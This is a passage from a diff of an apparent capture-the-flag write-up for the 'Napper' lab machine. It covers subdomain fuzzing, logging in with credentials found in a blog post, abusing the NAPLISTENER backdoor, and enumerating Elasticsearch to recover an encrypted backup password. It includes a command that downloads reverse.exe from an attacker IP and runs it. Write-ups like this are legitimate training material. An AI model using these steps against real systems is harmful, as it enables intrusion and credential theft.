@@ -39,6 +39,7 @@ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt 
 ```
 
 there is another subdomain to add it.
+
 It's time to visit the webserver at the following URL _https://app.napper.htb/_, we can see a few posts about: Sleeperbot, reverse engineering, .NET and use of powershell to setup SSL.
 The most interesting post is called _Enabling Basic Authentication on IIS Using PowerShell: A Step-by-Step Guide_ for two main reasons: the first one talk about an IIS (like our target machine) and the second one about a login credentials __("-Name:example|-String:ExamplePassword")__ very probably relating to the URL _internal.napper.htb_ that it has a login form.
 We can insert the previous credentials and gain access, there is a new posts that it talks about a _NAPLISTENER_ exploit that it allows to run a .exe by a remote request (at this path /ews/MsExgHealthCheckd/), if we continue to read at the following URL _https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph_ we can retrieve a Poc written in python (This one it has a little changes):
@@ -129,6 +130,7 @@ curl 10.10.16.98/reverse.exe -o reverse.exe
 .\reverse.exe
 ```
 Now we're able to take the flag and carry on with the privesc.
+
 It takes some time to search all around but we can see two interesting things: a _9200  (elastic port)_ and some files at the following path _C:\temp\www\internal\content\posts_ we read inside the _no-more-laps.md_ that the team want to store the backup's password  within the elastic DB, further research deep down in the _internal-laps-alpha_, we can found _a.exe (elastic executable)_ and .env (generic credentials for elastic db); this point I browse at the following URL _https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch/_
 to understand about elastic and this one it was very helpful _http://10.10.11.240:9200/_search?pretty=true_, it combines with curl and the previous credentials:
 ```bash
@@ -172,6 +174,7 @@ output:
 }
 ```
 the blob it's the password for the user but is encrypted, the last chance is to use ghidra against the _a.exe_ and understand how the key is generated.
+
 The seed is the same that used to generate the key, a loop long 16 byes is used to generate the key, at this point a chinese guy helped with the go script in order to retrieve the ket
 ```go
 package main
